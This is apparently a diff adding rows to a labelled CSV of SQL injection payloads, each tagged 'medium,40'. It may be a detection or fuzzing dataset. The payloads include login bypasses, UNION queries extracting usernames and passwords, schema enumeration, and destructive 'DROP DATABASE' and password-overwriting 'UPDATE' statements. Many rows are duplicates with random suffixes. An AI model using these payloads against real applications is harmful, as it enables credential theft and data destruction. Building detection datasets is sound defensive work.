+' OR username LIKE '%admin%' -- -- ,medium,40
+1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
+"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
+'; DROP DATABASE temp -- -- ,medium,40
+'; SELECT COUNT(*) FROM users -- -- ,medium,40
+"' UNION SELECT username, password FROM users -- -- ",medium,40
+' HAVING 1=1 # -- ,medium,40
+' HAVING 1=1 # -- ,medium,40
+'; DROP DATABASE temp -- -- ,medium,40
+1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
+'; SELECT @@version -- -- ,medium,40
+' HAVING 1=1 # -- ,medium,40
+"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
+'; SELECT COUNT(*) FROM users -- -- ,medium,40
+"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
+'; SELECT @@version -- -- ,medium,40
+' or 1=1 in (select * from users) -- -- ,medium,40
+'; DROP DATABASE temp -- -- ,medium,40
+'; UPDATE users SET password='pass' -- ,medium,40
+' HAVING 1=1 # -- ,medium,40
+' or 1=1 in (select * from users) -- -- ,medium,40
+"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
+'; SELECT @@version -- -- ,medium,40
+' or 1=1 in (select * from users) -- -- ,medium,40
+' or 1 = 1 LIMIT 1 -- -- ,medium,40
+' OR username LIKE '%admin%' -- -- ,medium,40
+' or 1 = 1 LIMIT 1 -- -- ,medium,40
+' HAVING 1=1 # -- ,medium,40
+1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
+' or 1=1 in (select * from users) -- -- ,medium,40
+'; UPDATE users SET password='pass' -- ,medium,40
+' or 1=1 in (select * from users) -- -- ,medium,40
+' HAVING 1=1 # -- ,medium,40
+"' UNION SELECT username, password FROM users -- -- ",medium,40
+'; DROP DATABASE temp -- -- ,medium,40
+'; SELECT @@version -- -- ,medium,40
+'; DROP DATABASE temp -- -- ,medium,40
+"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
+' OR username LIKE '%admin%' -- -- ,medium,40
+'; DROP DATABASE temp -- -- ,medium,40
+"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
+' OR username LIKE '%admin%' -- -- ,medium,40
+'; SELECT @@version -- -- ,medium,40
+"' UNION SELECT username, password FROM users -- -- ",medium,40
+"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
+' HAVING 1=1 # -- ,medium,40
+"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
+'; UPDATE users SET password='pass' -- ,medium,40
+"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
+' or 1=1 in (select * from users) -- -- ,medium,40
+' or 1=1 in (select * from users) -- -- ,medium,40
+' HAVING 1=1 # -- ,medium,40
+1' OR 1=1; SELECT * FROM users -- -- ,medium,40
+"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
+"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
+' HAVING 1=1 # -- ,medium,40
+'; UPDATE users SET password='pass' -- ,medium,40
+' or 1 = 1 LIMIT 1 -- -- ,medium,40
+'; DROP DATABASE temp -- -- ,medium,40
+"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
+'; SELECT COUNT(*) FROM users -- -- ,medium,40
+' OR username LIKE '%admin%' -- -- ,medium,40
+"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
+"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
+1' OR 1=1; SELECT * FROM users -- -- ,medium,40
+"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
+"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
+"' UNION SELECT username, password FROM users -- -- ",medium,40
+' or 1 = 1 LIMIT 1 -- -- ,medium,40
+'; SELECT @@version -- -- ,medium,40
+' UNION SELECT * FROM information_schema.tables -- -- ,medium,40
+1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
+' UNION SELECT * FROM information_schema.tables -- -- ,medium,40
+"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
+'; DROP DATABASE temp -- -- ,medium,40
+'; DROP DATABASE temp -- -- ,medium,40
+'; SELECT COUNT(*) FROM users -- -- ,medium,40
+' OR username LIKE '%admin%' -- -- ,medium,40
+"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
+1' OR 1=1; SELECT * FROM users -- -- ,medium,40
+' UNION SELECT * FROM information_schema.tables -- -- ,medium,40
+"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
+"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
+' OR username LIKE '%admin%' -- -- ,medium,40
+'; DROP DATABASE temp -- -- ,medium,40
+"' UNION SELECT username, password FROM users -- -- ",medium,40
+"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
+' OR username LIKE '%admin%' -- -- ,medium,40
+'; SELECT @@version -- -- ,medium,40
+'; SELECT @@version -- -- ,medium,40
+1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
+"' UNION ALL SELECT 1,2 FROM users -- # ue",medium,40
+' OR username LIKE '%admin%' -- # 5s,medium,40
+' or 1=1 in (select * from users) -- -- e,medium,40
+'; SELECT @@version -- # tc,medium,40
+'; DROP DATABASE temp -- /**/,medium,40
+1' OR '1' = '1' GROUP BY 1 -- # nz,medium,40
+1' OR '1' = '1' GROUP BY 1 -- -- 7,medium,40
+'; SELECT @@version -- # jz,medium,40
+' or 1 = 1 LIMIT 1 -- -- y,medium,40
+' HAVING 1=1 # /**/,medium,40
+' or 1 = 1 LIMIT 1 -- -- w,medium,40
+' HAVING 1=1 # -- e,medium,40
+' UNION SELECT * FROM information_schema.tables -- /**/,medium,40
+'; UPDATE users SET password='pass' # fm,medium,40
+' OR username LIKE '%admin%' -- /**/,medium,40
+' HAVING 1=1 # # jw,medium,40
+1' OR 1=1; SELECT * FROM users -- -- 0,medium,40
+' or 1=1 in (select * from users) -- /**/,medium,40
+1' OR 1=1; SELECT * FROM users -- -- l,medium,40
+' UNION SELECT * FROM information_schema.tables -- -- 8,medium,40
+'; UPDATE users SET password='pass' /**/,medium,40
+'; DROP DATABASE temp -- # pm,medium,40
+'; DROP DATABASE temp -- # pw,medium,40
+' HAVING 1=1 # -- r,medium,40
+' UNION SELECT * FROM information_schema.tables -- -- g,medium,40
+' HAVING 1=1 # -- e,medium,40
+1' OR '1' = '1' GROUP BY 1 -- -- 9,medium,40
+"' AND 1=0 UNION SELECT 1,2,3 -- /**/",medium,40
+' HAVING 1=1 # /**/,medium,40
+' or 1=1 in (select * from users) -- -- 9,medium,40
+"' UNION SELECT username, password FROM users -- # ud",medium,40
+1' OR '1' = '1' GROUP BY 1 -- /**/,medium,40
+' HAVING 1=1 # /**/,medium,40
+'; DROP DATABASE temp -- -- d,medium,40
+'; UPDATE users SET password='pass' -- l,medium,40
+1' OR 1=1; SELECT * FROM users -- /**/,medium,40
+1' OR '1' = '1' GROUP BY 1 -- /**/,medium,40
+'; SELECT @@version -- -- m,medium,40
+"' AND 1=0 UNION SELECT 1,2,3 -- # 0c",medium,40
+1' OR '1' = '1' GROUP BY 1 -- # do,medium,40
+1' OR 1=1; SELECT * FROM users -- /**/,medium,40
+' HAVING 1=1 # /**/,medium,40
+' OR username LIKE '%admin%' -- -- e,medium,40
+' or 1 = 1 LIMIT 1 -- -- f,medium,40
+' UNION SELECT * FROM information_schema.tables -- -- 0,medium,40
+'; UPDATE users SET password='pass' -- q,medium,40
+' or 1 = 1 LIMIT 1 -- -- 5,medium,40
+' HAVING 1=1 # /**/,medium,40
+'; UPDATE users SET password='pass' /**/,medium,40
+' HAVING 1=1 # /**/,medium,40
+' or 1 = 1 LIMIT 1 -- /**/,medium,40
+1' OR '1' = '1' GROUP BY 1 -- # 8j,medium,40
+"' OR '1'='1' UNION SELECT 1,2 -- # hk",medium,40
+'; UPDATE users SET password='pass' /**/,medium,40
+'; DROP DATABASE temp -- /**/,medium,40
+'; SELECT COUNT(*) FROM users -- /**/,medium,40
+' OR username LIKE '%admin%' -- -- f,medium,40
+'; UPDATE users SET password='pass' # d4,medium,40
+' UNION SELECT * FROM information_schema.tables -- /**/,medium,40
+'; SELECT COUNT(*) FROM users -- /**/,medium,40
+' OR username LIKE '%admin%' -- -- 7,medium,40
+'; SELECT COUNT(*) FROM users -- -- b,medium,40
+'; SELECT @@version -- # gc,medium,40
+"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
+'; SELECT COUNT(*) FROM users -- -- m,medium,40
+"' UNION SELECT username, password FROM users -- -- 9",medium,40
+"' OR '1'='1' UNION SELECT 1,2 -- # 2m",medium,40
+1' OR 1=1; SELECT * FROM users -- /**/,medium,40
+"' UNION SELECT username, password FROM users -- -- q",medium,40
+"' UNION ALL SELECT 1,2 FROM users -- /**/",medium,40
+'; SELECT @@version -- # n7,medium,40
+' or 1=1 in (select * from users) -- # pl,medium,40
+'; SELECT @@version -- /**/,medium,40
+1' OR 1=1; SELECT * FROM users -- -- 3,medium,40
+'; UPDATE users SET password='pass' # e5,medium,40
+' or 1 = 1 LIMIT 1 -- /**/,medium,40
+'; SELECT @@version -- /**/,medium,40
+' or 1=1 in (select * from users) -- -- t,medium,40
+'; DROP DATABASE temp -- # 4c,medium,40
+"' OR '1'='1' UNION SELECT 1,2 -- # 6m",medium,40
+' or 1 = 1 LIMIT 1 -- /**/,medium,40
+"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
+' UNION SELECT * FROM information_schema.tables -- -- i,medium,40
+1' OR 1=1; SELECT * FROM users -- -- j,medium,40
+"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
+' or 1 = 1 LIMIT 1 -- -- u,medium,40
+"' OR '1'='1' UNION SELECT 1,2 -- -- 0",medium,40
+1' OR '1' = '1' GROUP BY 1 -- # dz,medium,40
+'; SELECT @@version -- -- 4,medium,40
+'; SELECT COUNT(*) FROM users -- # dv,medium,40
+'; DROP DATABASE temp -- -- c,medium,40
+"' UNION ALL SELECT 1,2 FROM users -- # iy",medium,40
+"' UNION ALL SELECT 1,2 FROM users -- # 7n",medium,40
+'; UPDATE users SET password='pass' # n8,medium,40
+' HAVING 1=1 # -- f,medium,40
+'; SELECT COUNT(*) FROM users -- /**/,medium,40
+"' AND 1=0 UNION SELECT 1,2,3 -- # qt",medium,40
+' HAVING 1=1 # /**/,medium,40
+"' UNION ALL SELECT 1,2 FROM users -- # d0",medium,40
+' or 1 = 1 LIMIT 1 -- /**/,medium,40
+'; SELECT COUNT(*) FROM users -- /**/,medium,40
+' HAVING 1=1 # -- z,medium,40
+'; SELECT @@version -- # zm,medium,40
+"' OR '1'='1' UNION SELECT 1,2 -- -- p",medium,40
+1' OR 1=1; SELECT * FROM users -- /**/,medium,40
+'; DROP DATABASE temp -- /**/,medium,40
+"' OR '1'='1' UNION SELECT 1,2 -- -- 3",medium,40
+1' OR 1=1; SELECT * FROM users -- /**/,medium,40
+1' OR '1' = '1' GROUP BY 1 -- -- a,medium,40
+'; DROP DATABASE temp -- -- m,medium,40
+' or 1 = 1 LIMIT 1 -- -- t,medium,40
+'; UPDATE users SET password='pass' -- o,medium,40
+' OR username LIKE '%admin%' -- # 89,medium,40
+"' UNION SELECT username, password FROM users -- # v3",medium,40
+' UNION SELECT * FROM information_schema.tables -- /**/,medium,40
+"' OR '1'='1' UNION SELECT 1,2 -- # 1t",medium,40
+' OR username LIKE '%admin%' -- -- r,medium,40
+1' OR 1=1; SELECT * FROM users -- # w7,medium,40
+' HAVING 1=1 # -- g,medium,40
+1' OR 1=1; SELECT * FROM users -- # at,medium,40
+"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
+' or 1 = 1 LIMIT 1 -- /**/,medium,40
+' or 1 = 1 LIMIT 1 -- # 14,medium,40
+"' UNION ALL SELECT 1,2 FROM users -- -- 7",medium,40
+' OR username LIKE '%admin%' -- # au,medium,40
+'; SELECT COUNT(*) FROM users -- # 89,medium,40
+1' OR 1=1; SELECT * FROM users -- -- p,medium,40
+'; UPDATE users SET password='pass' # yc,medium,40
+' or 1 = 1 LIMIT 1 -- -- f,medium,40
+"' UNION SELECT username, password FROM users -- /**/",medium,40
+'; DROP DATABASE temp -- /**/,medium,40
+' UNION SELECT * FROM information_schema.tables -- /**/,medium,40
+'; DROP DATABASE temp -- /**/,medium,40
+1' OR '1' = '1' GROUP BY 1 -- -- s,medium,40
+'; SELECT @@version -- -- f,medium,40
+' HAVING 1=1 # # u5,medium,40
+' HAVING 1=1 # /**/,medium,40
+"' UNION SELECT username, password FROM users -- -- x",medium,40
+'; UPDATE users SET password='pass' # pa,medium,40
+'; UPDATE users SET password='pass' /**/,medium,40
+1' OR 1=1; SELECT * FROM users -- # jo,medium,40
+"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
+' UNION SELECT * FROM information_schema.tables -- # rx,medium,40
+"' UNION SELECT username, password FROM users -- -- 4",medium,40
+"' UNION ALL SELECT 1,2 FROM users -- # n2",medium,40
+1' OR 1=1; SELECT * FROM users -- # ni,medium,40
+"' UNION SELECT username, password FROM users -- # 88",medium,40
+' UNION SELECT * FROM information_schema.tables -- /**/,medium,40
+'; DROP DATABASE temp -- # bq,medium,40
+"' UNION SELECT username, password FROM users -- /**/",medium,40
+'; SELECT @@version -- -- 8,medium,40
+' OR username LIKE '%admin%' -- -- 2,medium,40
+' OR username LIKE '%admin%' -- /**/,medium,40
+' UNION SELECT * FROM information_schema.tables -- -- m,medium,40
+' OR username LIKE '%admin%' -- -- c,medium,40
+"' AND 1=0 UNION SELECT 1,2,3 -- /**/",medium,40
+"' AND 1=0 UNION SELECT 1,2,3 -- # kd",medium,40
+"' UNION ALL SELECT 1,2 FROM users -- /**/",medium,40
+1' OR '1' = '1' GROUP BY 1 -- # 8m,medium,40
+1' OR 1=1; SELECT * FROM users -- -- f,medium,40
+'; DROP DATABASE temp -- # 70,medium,40
+' UNION SELECT * FROM information_schema.tables -- -- y,medium,40
+"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
+1' OR '1' = '1' GROUP BY 1 -- -- 7,medium,40
+"' UNION SELECT username, password FROM users -- -- w",medium,40
+1' OR 1=1; SELECT * FROM users -- -- w,medium,40
+' UNION SELECT * FROM information_schema.tables -- # xa,medium,40
+"' UNION ALL SELECT 1,2 FROM users -- /**/",medium,40
+'; UPDATE users SET password='pass' -- m,medium,40
+'; DROP DATABASE temp -- -- h,medium,40
+"' AND 1=0 UNION SELECT 1,2,3 -- -- 5",medium,40
+'; SELECT COUNT(*) FROM users -- # yv,medium,40
+'; SELECT @@version -- -- e,medium,40
+'; SELECT COUNT(*) FROM users -- # in,medium,40
+' or 1=1 in (select * from users) -- -- c,medium,40
+1' OR 1=1; SELECT * FROM users -- -- v,medium,40
+"' OR '1'='1' UNION SELECT 1,2 -- # hn",medium,40
+"' AND 1=0 UNION SELECT 1,2,3 -- -- o",medium,40
+' or 1 = 1 LIMIT 1 -- -- c,medium,40
+' UNION SELECT * FROM information_schema.tables -- -- 1,medium,40
+' or 1 = 1 LIMIT 1 -- # o1,medium,40
+'; SELECT COUNT(*) FROM users -- # h9,medium,40
+' OR username LIKE '%admin%' -- /**/,medium,40
+' or 1 = 1 LIMIT 1 -- # wf,medium,40
+1' OR '1' = '1' GROUP BY 1 -- -- g,medium,40
+1' OR 1=1; SELECT * FROM users -- /**/,medium,40
+"' UNION ALL SELECT 1,2 FROM users -- # jw",medium,40
+' HAVING 1=1 # /**/,medium,40
+'; SELECT @@version -- # hp,medium,40
+"' UNION SELECT username, password FROM users -- # d8",medium,40
+"' UNION SELECT username, password FROM users -- /**/",medium,40
+1' OR '1' = '1' GROUP BY 1 -- # de,medium,40
+'; DROP DATABASE temp -- /**/,medium,40
+'; UPDATE users SET password='pass' /**/,medium,40
+' or 1 = 1 LIMIT 1 -- -- z,medium,40
+'; DROP DATABASE temp -- /**/,medium,40
+"' UNION SELECT username, password FROM users -- /**/",medium,40
+'; SELECT @@version -- # 3s,medium,40
+1' OR '1' = '1' GROUP BY 1 -- /**/,medium,40
+1' OR 1=1; SELECT * FROM users -- /**/,medium,40
+1' OR 1=1; SELECT * FROM users -- # sl,medium,40
+1' OR 1=1; SELECT * FROM users -- -- 0,medium,40
+1' OR '1' = '1' GROUP BY 1 -- /**/,medium,40
+1' OR '1' = '1' GROUP BY 1 -- /**/,medium,40
+1' OR '1' = '1' GROUP BY 1 -- # 7p,medium,40
+' HAVING 1=1 # /**/,medium,40
+"' AND 1=0 UNION SELECT 1,2,3 -- /**/",medium,40
+'; DROP DATABASE temp -- /**/,medium,40
+1' OR 1=1; SELECT * FROM users -- # wr,medium,40
+'; SELECT COUNT(*) FROM users -- -- 2,medium,40
+' or 1=1 in (select * from users) -- # vz,medium,40
+' or 1=1 in (select * from users) -- # zb,medium,40
+' UNION SELECT * FROM information_schema.tables -- -- p,medium,40
+'; SELECT COUNT(*) FROM users -- # uf,medium,40
+"' UNION ALL SELECT 1,2 FROM users -- # im",medium,40
+'; DROP DATABASE temp -- -- q,medium,40
+"' UNION ALL SELECT 1,2 FROM users -- -- 3",medium,40
+1' OR '1' = '1' GROUP BY 1 -- # t2,medium,40
+1' OR 1=1; SELECT * FROM users -- -- 1,medium,40
+' HAVING 1=1 # # tf,medium,40
+"' AND 1=0 UNION SELECT 1,2,3 -- # 2v",medium,40
+'; DROP DATABASE temp -- # mp,medium,40
+'; UPDATE users SET password='pass' -- g,medium,40
+1' OR '1' = '1' GROUP BY 1 -- /**/,medium,40
+' or 1=1 in (select * from users) -- /**/,medium,40
+'; SELECT @@version -- -- e,medium,40
+"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
+' UNION SELECT * FROM information_schema.tables -- # 7y,medium,40
+"' UNION SELECT username, password FROM users -- -- 2",medium,40
+' UNION SELECT * FROM information_schema.tables -- # vc,medium,40
+' or 1 = 1 LIMIT 1 -- /**/,medium,40
+"' AND 1=0 UNION SELECT 1,2,3 -- -- d",medium,40
+'; SELECT COUNT(*) FROM users -- /**/,medium,40
+' HAVING 1=1 # /**/,medium,40
+"' OR '1'='1' UNION SELECT 1,2 -- # wa",medium,40
+' UNION SELECT * FROM information_schema.tables -- -- q,medium,40
+"' UNION SELECT username, password FROM users -- # pr",medium,40
+"' AND 1=0 UNION SELECT 1,2,3 -- /**/",medium,40
+' or 1=1 in (select * from users) -- # wd,medium,40
+' UNION SELECT * FROM information_schema.tables -- # j2,medium,40
+'; SELECT COUNT(*) FROM users -- -- s,medium,40
+'; SELECT @@version -- # dv,medium,40
+' or 1 = 1 LIMIT 1 -- /**/,medium,40
+' or 1=1 in (select * from users) -- /**/,medium,40
+1' OR 1=1; SELECT * FROM users -- # vs,medium,40
+'; SELECT @@version -- # wt,medium,40
+"' AND 1=0 UNION SELECT 1,2,3 -- # 1e",medium,40
+"' UNION ALL SELECT 1,2 FROM users -- /**/",medium,40
+1' OR 1=1; SELECT * FROM users -- -- b,medium,40
+' OR username LIKE '%admin%' -- /**/,medium,40
+'; DROP DATABASE temp -- -- b,medium,40
+1' OR 1=1; SELECT * FROM users -- /**/,medium,40
+' or 1=1 in (select * from users) -- /**/,medium,40
+'; UPDATE users SET password='pass' -- l,medium,40
+"' AND 1=0 UNION SELECT 1,2,3 -- # w6",medium,40
+' HAVING 1=1 # /**/,medium,40
+1' OR '1' = '1' GROUP BY 1 -- # 8j,medium,40
+"' UNION SELECT username, password FROM users -- # be",medium,40
+' OR username LIKE '%admin%' -- -- z,medium,40
+1' OR 1=1; SELECT * FROM users -- /**/,medium,40
+"' AND 1=0 UNION SELECT 1,2,3 -- # 3b",medium,40
+1' OR '1' = '1' GROUP BY 1 -- /**/,medium,40
+'; DROP DATABASE temp -- -- b,medium,40
+'; SELECT @@version -- /**/,medium,40
+"' AND 1=0 UNION SELECT 1,2,3 -- # c4",medium,40
+' OR username LIKE '%admin%' -- /**/,medium,40
+'; DROP DATABASE temp -- -- b,medium,40
+"' OR '1'='1' UNION SELECT 1,2 -- # gh",medium,40
+"' AND 1=0 UNION SELECT 1,2,3 -- -- r",medium,40
+"' UNION SELECT username, password FROM users -- # v1",medium,40
+' HAVING 1=1 # # 2c,medium,40
+'; SELECT COUNT(*) FROM users -- # 3s,medium,40
+"' UNION ALL SELECT 1,2 FROM users -- # l5",medium,40
+'; DROP DATABASE temp -- # 7f,medium,40
+'; SELECT @@version -- -- s,medium,40
+1' OR '1' = '1' GROUP BY 1 -- -- 9,medium,40
+'; SELECT COUNT(*) FROM users -- /**/,medium,40
+' or 1=1 in (select * from users) -- /**/,medium,40
+' or 1 = 1 LIMIT 1 -- # p2,medium,40
+'; SELECT COUNT(*) FROM users -- /**/,medium,40
+'; DROP DATABASE temp -- /**/,medium,40
+1' OR 1=1; SELECT * FROM users -- -- w,medium,40
+'; SELECT COUNT(*) FROM users -- # 92,medium,40
+' UNION SELECT * FROM information_schema.tables -- # qa,medium,40
+"' OR '1'='1' UNION SELECT 1,2 -- # zv",medium,40
+"' AND 1=0 UNION SELECT 1,2,3 -- /**/",medium,40
+' or 1=1 in (select * from users) -- /**/,medium,40
+"' AND 1=0 UNION SELECT 1,2,3 -- # 5x",medium,40
+'; SELECT COUNT(*) FROM users -- -- b,medium,40
+1' OR 1=1; SELECT * FROM users -- -- y,medium,40
+'; SELECT @@version -- # ry,medium,40
+' or 1=1 in (select * from users) -- -- g,medium,40
+1' OR '1' = '1' GROUP BY 1 -- /**/,medium,40
+' OR username LIKE '%admin%' -- /**/,medium,40
+1' OR '1' = '1' GROUP BY 1 -- # 02,medium,40
+' UNION SELECT * FROM information_schema.tables -- -- 6,medium,40
+"' UNION SELECT username, password FROM users -- /**/",medium,40
+' or 1 = 1 LIMIT 1 -- -- u,medium,40
+"' AND 1=0 UNION SELECT 1,2,3 -- /**/",medium,40
+' or 1 = 1 LIMIT 1 -- /**/,medium,40
+'; DROP DATABASE temp -- /**/,medium,40
+'; SELECT @@version -- /**/,medium,40
+1' OR 1=1; SELECT * FROM users -- /**/,medium,40
+"' OR '1'='1' UNION SELECT 1,2 -- -- 8",medium,40
+"' UNION ALL SELECT 1,2 FROM users -- -- d",medium,40
+'; UPDATE users SET password='pass' -- 8,medium,40
+"' UNION ALL SELECT 1,2 FROM users -- -- 4",medium,40
+' OR username LIKE '%admin%' -- /**/,medium,40
+1' OR 1=1; SELECT * FROM users -- # fw,medium,40
+' OR username LIKE '%admin%' -- /**/,medium,40
+"' UNION SELECT username, password FROM users -- -- 9",medium,40
+' HAVING 1=1 # -- d,medium,40
+'; DROP DATABASE temp -- # g3,medium,40
+' or 1 = 1 LIMIT 1 -- # ba,medium,40
+' or 1=1 in (select * from users) -- -- i,medium,40
+"' UNION SELECT username, password FROM users -- /**/",medium,40
+"' AND 1=0 UNION SELECT 1,2,3 -- # 0a",medium,40
+' or 1 = 1 LIMIT 1 -- -- t,medium,40
+'; DROP DATABASE temp -- -- u,medium,40
+' or 1=1 in (select * from users) -- -- 3,medium,40
+'; SELECT COUNT(*) FROM users -- # q9,medium,40
+'; SELECT @@version -- # 3b,medium,40
+' UNION SELECT * FROM information_schema.tables -- # 9k,medium,40
+1' OR 1=1; SELECT * FROM users -- # d1,medium,40
+' UNION SELECT * FROM information_schema.tables -- # t3,medium,40
+1' OR '1' = '1' GROUP BY 1 -- /**/,medium,40
+"' AND 1=0 UNION SELECT 1,2,3 -- /**/",medium,40
+'; UPDATE users SET password='pass' # 4p,medium,40
+1' OR 1=1; SELECT * FROM users -- -- b,medium,40
+'; SELECT @@version -- # 9q,medium,40
+1' OR 1=1; SELECT * FROM users -- -- b,medium,40
+1' OR 1=1; SELECT * FROM users -- /**/,medium,40
+' or 1 = 1 LIMIT 1 -- /**/,medium,40
+' HAVING 1=1 # /**/,medium,40
